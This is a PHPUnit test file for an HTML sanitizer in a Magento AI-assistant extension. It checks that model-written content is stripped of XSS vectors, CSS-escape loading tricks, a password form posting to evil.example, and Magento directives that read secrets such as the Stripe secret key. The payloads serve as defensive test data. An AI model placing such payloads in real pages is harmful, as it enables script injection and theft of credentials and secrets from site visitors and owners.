<?php
/**
 * Copyright © 2026 Roman Pasichnyk
 * SPDX-License-Identifier: OSL-3.0 OR AFL-3.0
 */
declare(strict_types=1);

namespace Zero\AiAssistant\Test\Unit\Model;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Zero\AiAssistant\Model\ModelHtml;

/**
 * What the model writes: nothing that runs, no directive it could use,
 * the rest (Page Builder's markup, the site's own directives) kept.
 */
class ModelHtmlTest extends TestCase
{
    public function testNothingThatRunsStays(): void
    {
        $clean = (new ModelHtml())->clean(
            '<p onclick="steal()">Hi <a href="javascript:alert(1)">x</a> <a href=" JaVa&#x09;script:alert(1)">y</a></p>'
            . '<script>alert(1)</script><iframe src="https://evil.example"></iframe><img src=x onerror="alert(1)">'
            . '<form action="https://evil.example"><input name="password"></form><svg onload="alert(1)"></svg>'
            . '<div style="background:url(https://evil.example/t.gif)">s</div><style>@import "https://evil.example/x.css";</style>'
            . '<!--[if IE]><script>alert(1)</script><![endif]--><a href="data:text/html,<script>alert(1)</script>">d</a>'
        );
        foreach (['onclick', 'javascript', 'script', 'iframe', 'onerror', 'form', 'password', 'svg', 'evil.example', '@import', 'data:'] as $bad) {
            $this->assertStringNotContainsStringIgnoringCase($bad, $clean);
        }
        $this->assertStringContainsString('Hi', $clean);
    }

    /**
     * CSS reads \75rl( as url( and @\69mport as @import, and image-set("…") loads
     * a file without url(: none of them may get past the CSS check.
     *
     */
    #[DataProvider('cssThatLoadsSomething')]
    public function testCssThatLoadsSomethingIsDroppedEvenWrittenWithEscapes(string $html): void
    {
        $clean = (new ModelHtml())->clean($html);
        $this->assertStringNotContainsString('evil.example', $clean);
    }

    public static function cssThatLoadsSomething(): array
    {
        return [
            'escaped url in a style attribute' => ['<div style="background:\\75rl(//evil.example/t.gif)">s</div>'],
            'escaped url with a long escape' => ['<div style="background:\\000075rl(//evil.example/t.gif)">s</div>'],
            'escaped url in a style element' => ['<style>a{background:\\75rl(//evil.example/t.gif)}</style><a>x</a>'],
            'escaped import' => ['<style>@\\69mport "//evil.example/x.css";</style>'],
            'image-set' => ['<div style="background:image-set(\'//evil.example/t.gif\' 1x)">s</div>'],
            'webkit image-set' => ['<div style="background:-webkit-image-set(\'//evil.example/t.gif\' 1x)">s</div>'],
        ];
    }

    public function testPageBuilderAndSafeLinksStay(): void
    {
        $html = '<div data-content-type="row" data-appearance="contained" data-element="main" data-pb-style="AB12" class="row">'
            . '<h2>Title</h2><p><a href="/sale.html" target="_blank">Sale</a> <a href="https://example.com/x">Out</a>'
            . ' <a href="mailto:a@example.com">Mail</a> <a href="tel:+380441234567">Call</a></p>'
            . '<img src="{{media url="wysiwyg/a.jpg"}}" alt="A"><img src="{{upload:3}}" alt="B"></div>'
            . '<style>#html-body [data-pb-style=AB12]{justify-content:flex-start;display:flex}</style>';
        $clean = (new ModelHtml())->clean($html);
        foreach (['data-pb-style="AB12"', 'data-content-type="row"', 'href="/sale.html"', 'href="https://example.com/x"', 'mailto:a@example.com',
            'tel:+380441234567', '{{media url="wysiwyg/a.jpg"}}', '{{upload:3}}', 'justify-content:flex-start', 'Привіт'] as $kept) {
            if ($kept === 'Привіт') {
                $this->assertStringContainsString($kept, (new ModelHtml())->clean('<p>Привіт</p>'), 'UTF-8 survives');
                continue;
            }
            $this->assertStringContainsString($kept, $clean);
        }
    }

    public function testDirectivesOnlyTheSafeOnesAndTheOnesAlreadyThere(): void
    {
        $model = new ModelHtml();
        $existing = '<p>{{widget type="Magento\CatalogWidget\Block\Product\ProductsList" products_count="4"}}</p>';
        $clean = $model->clean(
            '<p>{{widget type="Magento\CatalogWidget\Block\Product\ProductsList" products_count="4"}}</p>'
            . '<p>{{block class="Magento\Framework\View\Element\Template" template="Magento_Backend::x.phtml"}}</p>'
            . '<p>{{config path="payment/stripe/secret_key"}}</p><p>{{var this.getUrl()}}</p><p>{{store url="contact"}}</p>'
            . '<p>{<script></script>{var x}}</p>',
            $existing
        );
        $this->assertStringContainsString('{{widget type="Magento\CatalogWidget\Block\Product\ProductsList" products_count="4"}}', $clean, 'already on the page');
        $this->assertStringContainsString('{{store url="contact"}}', $clean);
        foreach (['{{block', 'secret_key', '{{var', 'getUrl'] as $bad) {
            $this->assertStringNotContainsString($bad, $clean);
        }
        $this->assertStringNotContainsString('{{var x}}', $clean, 'a directive put together by what was removed');
        $this->assertSame('Sale { {', $model->text('Sale {{var x}}{{'));
    }

    public function testSafeUrlsAndTheSummaryShowsWhereLinksGo(): void
    {
        $this->assertTrue(ModelHtml::isSafeUrl('/x'));
        $this->assertTrue(ModelHtml::isSafeUrl('https://a.example'));
        $this->assertFalse(ModelHtml::isSafeUrl('javascript:alert(1)'));
        $this->assertFalse(ModelHtml::isSafeUrl("java\nscript:alert(1)"));
        $this->assertFalse(ModelHtml::isSafeUrl('vbscript:x'));
        $summary = (new ModelHtml())->summary('content', '<p>Text</p><a href="https://pay.evil.example/iban">pay</a><img src="//cdn.example/a.png">');
        $this->assertSame('pay.evil.example, cdn.example', $summary['content: links and images to']);
        $this->assertStringContainsString('Text', $summary['content']);
    }
}
